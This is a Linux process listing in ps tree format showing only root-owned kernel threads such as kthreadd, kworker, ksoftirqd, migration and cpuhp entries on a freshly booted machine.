USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           2  0.0  0.0      0     0 ?        S    19:43   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        S    19:43   0:00  \_ [pool_workqueue_release]
root           4  0.0  0.0      0     0 ?        I<   19:43   0:00  \_ [kworker/R-rcu_gp]
root           5  0.0  0.0      0     0 ?        I<   19:43   0:00  \_ [kworker/R-sync_wq]
root           6  0.0  0.0      0     0 ?        I<   19:43   0:00  \_ [kworker/R-kvfree_rcu_reclaim]
root           7  0.0  0.0      0     0 ?        I<   19:43   0:00  \_ [kworker/R-slub_flushwq]
root           8  0.0  0.0      0     0 ?        I<   19:43   0:00  \_ [kworker/R-netns]
root          10  0.0  0.0      0     0 ?        I    19:43   0:00  \_ [kworker/0:1-events]
root          11  0.0  0.0      0     0 ?        I<   19:43   0:00  \_ [kworker/0:0H-events_highpri]
root          12  0.0  0.0      0     0 ?        I    19:43   0:00  \_ [kworker/u512:0-ipv6_addrconf]
root          13  0.0  0.0      0     0 ?        I<   19:43   0:00  \_ [kworker/R-mm_percpu_wq]
root          14  0.0  0.0      0     0 ?        I    19:43   0:00  \_ [rcu_tasks_kthread]
root          15  0.0  0.0      0     0 ?        I    19:43   0:00  \_ [rcu_tasks_rude_kthread]
root          16  0.0  0.0      0     0 ?        I    19:43   0:00  \_ [rcu_tasks_trace_kthread]
root          17  0.0  0.0      0     0 ?        S    19:43   0:00  \_ [ksoftirqd/0]
root          18  0.0  0.0      0     0 ?        I    19:43   0:00  \_ [rcu_preempt]
root          19  0.0  0.0      0     0 ?        S    19:43   0:00  \_ [rcu_exp_par_gp_kthread_worker/1]
root          20  0.0  0.0      0     0 ?        S    19:43   0:00  \_ [rcu_exp_gp_kthread_worker]
root          21  0.0  0.0      0     0 ?        S    19:43   0:00  \_ [migration/0]
root          22  0.0  0.0      0     0 ?        S    19:43   0:00  \_ [idle_inject/0]
root          23  0.0  0.0      0     0 ?        S    19:43   0:00  \_ [cpuhp/0]
root          24  0.0  0.0      0     0 ?        S    19:43   0:00  \_ [cpuhp/1]
root          25  0.0  0.0      0     0 ?        S    19:43   0:00  \_ [idle_inject/1]
root          26  0.0  0.0      0     0 ?        S    19:43   0:00  \_ [migration/1]
root          27  0.0  0.0      0     0 ?        S    19:43   0:00  \_ [ksoftirqd/1]
root          29  0.0  0.0      0     0 ?        I<   19:43   0:00  \_ [kworker/1:0H-events_highpri]
root          30  0.0  0.0      0     0 ?        S    19:43   0:00  \_ [cpuhp/2]
root          31  0.0  0.0      0     0 ?        S    19:43   0:00  \_ [idle_inject/2]
root          32  0.0  0.0      0     0 ?        S    19:43   0:00  \_ [migration/2]
root          33  0.0  0.0      0     0 ?        S    19:43   0:00  \_ [ksoftirqd/2]
root          34  0.0  0.0      0     0 ?        I    19:43   0:00  \_ [kworker/2:0-events]
root          35  0.0  0.0      0     0 ?        I<   19:43   0:00  \_ [kworker/2:0H-kblockd]
root          36  0.0  0.0      0     0 ?        S    19:43   0:00  \_ [cpuhp/3]
root          37  0.0  0.0      0     0 ?        S    19:43   0:00  \_ [idle_inject/3]
root          38  0.0  0.0      0     0 ?        S    19:43   0:00  \_ [migration/3]
root          39  0.0  0.0      0     0 ?        S    19:43   0:00  \_ [ksoftirqd/3]
root          40  0.0  0.0      0     0 ?        I    19:43   0:00  \_ [kworker/3:0-cgroup_destroy]
root          41  0.0  0.0      0     0 ?        I<   19:43   0:00  \_ [kworker/3:0H-events_highpri]
root          42  0.0  0.0      0     0 ?        I    19:43   0:00  \_ [kworker/u513:0-flush-8:0]
root          43  0.0  0.0      0     0 ?        I    19:43   0:00  \_ [kworker/u514:0-flush-8:0]
root          44  0.0  0.0      0     0 ?        I    19:43   0:00  \_ [kworker/u515:0-flush-8:0]
root          46  0.0  0.0      0     0 ?        S    19:43   0:00  \_ [kdevtmpfs]
root          47  0.0  0.0      0     0 ?        I<   19:43   0:00  \_ [kworker/R-inet_frag_wq]
root          48  0.0  0.0      0     0 ?        S    19:43   0:00  \_ [kauditd]
root          49  0.0  0.0      0     0 ?        S    19:43   0:00  \_ [khungtaskd]
root          50  0.0  0.0      0     0 ?        S    19:43   0:00  \_ [oom_reaper]
root          52  0.0  0.0      0     0 ?        I    19:43   0:00  \_ [kworker/u513:2-ext4-rsv-conversion]
root          53  0.0  0.0      0     0 ?        I<   19:43   0:00  \_ [kworker/R-writeback]
root          54  0.0  0.0      0     0 ?        S    19:43   0:00  \_ [kcompactd0]
root          55  0.0  0.0      0     0 ?        SN   19:43   0:00  \_ [ksmd]
root          56  0.0  0.0      0     0 ?        SN   19:43   0:00  \_ [khugepaged]
root          57  0.0  0.0      0     0 ?        I<   19:43   0:00  \_ [kworker/R-kintegrityd]
root          58  0.0  0.0      0     0 ?        I<   19:43   0:00  \_ [kworker/R-kblockd]
root          59  0.0  0.0      0     0 ?        I<   19:43   0:00  \_ [kworker/R-blkcg_punt_bio]
root          60  0.0  0.0      0     0 ?        S    19:43   0:00  \_ [irq/9-acpi]
root          61  0.0  0.0      0     0 ?        I    19:43   0:00  \_ [kworker/3:1-events]
root          62  0.0  0.0      0     0 ?        I<   19:43   0:00  \_ [kworker/R-tpm_dev_wq]
